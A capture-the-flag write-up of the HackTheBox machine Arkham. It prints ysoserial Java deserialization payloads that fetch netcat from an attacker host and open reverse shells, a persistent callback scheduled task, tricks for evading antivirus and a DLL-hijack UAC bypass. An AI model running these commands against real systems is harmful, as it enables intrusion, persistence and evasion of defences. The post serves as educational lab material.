---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-28-arkham-hackthebox
tags:
- deserialization
- hackthebox
- java
- tunneling
- uac bypass
- windows
title: Arkham @ HackTheBox
---

Arkham was a surprisingly hard box for the 30 points that were awarded for it, as I was struggling quite a bit, especially for the user part. However in the end i enjoyed the box a lot because it forced me to use stuff I don’t encounter often and therefore was a great learning experience. Techniques used are the exploitation of java deserialization vulnerability, traffic tunneling via aspx and an UAC bypass.

## User Flag

The initial nmap scans showed the following ports:

```
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
```

We start by looking at port 445 with `smbmap -H 10.10.10.130 -u 'anonymous'` and see the following shares:

```
[+] IP: 10.10.10.130:445    Name: arkham.htb
    Disk                                                    Permissions
    ----                                                    -----------
    ADMIN$                                             NO ACCESS
    BatShare                                            READ ONLY
    C$                                                 NO ACCESS
    IPC$                                               READ ONLY
    Users                                               READ ONLY
```

On "BatShare" we find a single zip archive called "appserver.zip" which we download. After unzipping we get a file called "backup.img", where we run `file` on and see that it’s a luks encrypted disk image.

```
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

I tried some default passwords but could not get it to decrypt so I used `binwalk -e` on it which surprisingly gave some usable files! To be honest I don’t really know why there would be clear text files in a luks encrypted image, maybe this situation was created artificially. In the extracted image we find a folder "Mask\\tomcat-stuff" in which we see several configuration files, one of them being "web.xml.bak". That files contains some relevant information:

```
<servlet-name>Faces Servlet</servlet-name>
<url-pattern>*.faces</url-pattern>
...
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
```

This looks like something in tomcat is encrypted and has an hmac with the sha1 algorithm. We also learned that there is some kind of java faces application on tomcat so it’  
s time to look at port 8080. We find a website there with a lot of dead links, but one of the linked pages catches the eye (`http://arkham.htb:8080/userSubscribe.faces`):

![](htb_arkham_subscribe.png)

When we enter something and send it through burp we see the following request:

```
POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Cookie: JSESSIONID=B635ACF624EC87953F1C0A08F8C3195F
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=dsa&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
```

The `javax.faces.viewState` parameter looks suspicious however when we base64 decode it, it gives nothing readable. Looking a bit in to java faces vulnerabilities we learn that the ViewState is potentially vulnerable to deserialization vulnerabilities. For example this [post](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html) gives some insight in how the ViewState is vulnerable.

The goto tool to exploit these kind of vulnerabilities is [ysoserial](https://github.com/frohoff/ysoserial), which can be used to create deserialization payloads for various libraries. However there remain 2 major problems – we have to find out which library is being used by the faces application and we have to encrypt the payload, generate an hmac, base64- and url encode it.

First of all I wrote a script that does the crypto and encoding which you can find [here](https://gist.github.com/xct/03d21af76686b549ec0639e6e7d57f22). Then, since I did not know much about the application I generated all of the ysoserial payloads, fed them into the script and then into burp. The payload that finally did it was generated like that:

```
java -jar ~/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections5 'powershell.exe -exec bypass Invoke-WebRequest "http://10.10.14.14:8000/nc64.exe" -OutFile "c:\windows\system32\spool\drivers\color\nc64.exe"' > xct_ra

python3 arkham.py xct_raw
```

The payload just downloads the 64-Bit version of netcat from our attacker box onto the target via powershell. After sending the payload we get a request on our local python webserver and see that the payload indeed worked.

Now we generate another payload that executes nc64.exe and get a shell as user "Alfred":

```
java -jar ~/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections5 'c:\windows\system32\spool\drivers\color\nc64.exe 10.10.14.14 1337 -e cmd.exe' > xct_raw 

python3 arkham.py xct_raw
```

As Alfred we can now read the user flag.

## Root Flag

In Alfreds "Downloads" folder we find a file called "backup.zip" which we download and analyze. The contained file is called "alfred@arkham.local.ost" and a quick `file` on it reveals its type:

```
alfred@arkham.local.ost: Microsoft Outlook email folder
```

A quick convert via `readpst -rS` reveals the following content:

```
➜  alfred@arkham.local.ost1 ls -R
.:
 Calendar   Drafts   Inbox  'Sync Issues'

./Calendar:

./Drafts:
1  1-image001.png

./Inbox:

'./Sync Issues':
```

The image has the password of batman in it, which is `Zx^#QZX+T!123`. However as it turns out we can’t do too much with this password after all. It’s possible to connect via SMB to the Users share (what we did earlier anonymously), which confirms that the passwords works but I didn’t find any interesting files in it. When we look at the the user batman we notice that he is in the "Remote Management Users" group, which is the group windows uses for WinRM users:

```
...
Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

S

ince WinRM is however only listening locally we have to find some way to pivot. Thinking back to another recent box and seeing that on tcp port 80 we have IIS running we use [reGeorg](https://github.com/sensepost/reGeorg) again to reach WinRM through a jsp tunnel. Getting the payload to work was a bit tricky since it got detected by windows defender. To make it work I changed some strings in the payload which to my surprise was enough too fool the av.

To get the proxy up we change the mentioned strings and upload the tunnel.jsp to `C:\tomcat\apache-tomcat-8.5.37\webapps\ROOT`. Then we adjust our local `/etc/proxychains.conf` to point to the local port (10000) we will start reGeorg on and then finally start reGeorg with `python reGeorgSocksProxy.py -u http://arkham.htb:8080/tunnel2.jsp -p 10000`. Now that the tunnel is running we use the ruby [shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) by alamot together with proxychains to connect to WinRM as batman:

![](htb_arkham_regeorg_winrm.png)

It turns out the shell is actually pretty unstable and awkward so we create a scheduled task that connects back to us every minute (as user batman) to avoid using the tunnel more than necessary:

```
SchTasks /Create /SC minute /TN "xct" /TR "c:\windows\system32\spool\drivers\color\nc64.exe 10.10.14.14 9999 -e cmd.exe"
```

Sadly batman can’t read the root flag either. I was very lost on what is actually stopping batman from reading the flag or most other files that have full access for the administrators group that batman is a member of. After researching the issue for a while I found that it is actually UAC that is blocking most stuff that requires admin privileges. So how can we bypass it ? There exist several ways to bypass UAC, I found a nice [blogpost](https://egre55.github.io/system-properties-uac-bypass/) by [egre55](https://twitter.com/egre55) that has a bypass which abuses the library path load order of some windows binaries, effectively loading a malicious dll for us.

To exploit it we just have to create a [simple dll](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) and put it under "C:\\Users\\Batman\\AppData\\Local\\Microsoft\\WindowsApps\\". Then we call the binaries that can potentially load our dll…

```
SystemPropertiesAdvanced.exe
SystemPropertiesComputerName.exe
SystemPropertiesHardware.exe
SystemPropertiesProtection.exe
SystemPropertiesRemote.exe
```

…and wait for the bind shell specified in the dll to open. After a moment it opens, we connect to it via nc to localhost and can read the root flag.

This box was very challenging and fun for me, many thanks to [MinatoTW](https://twitter.com/MinatoTW_) for creating it.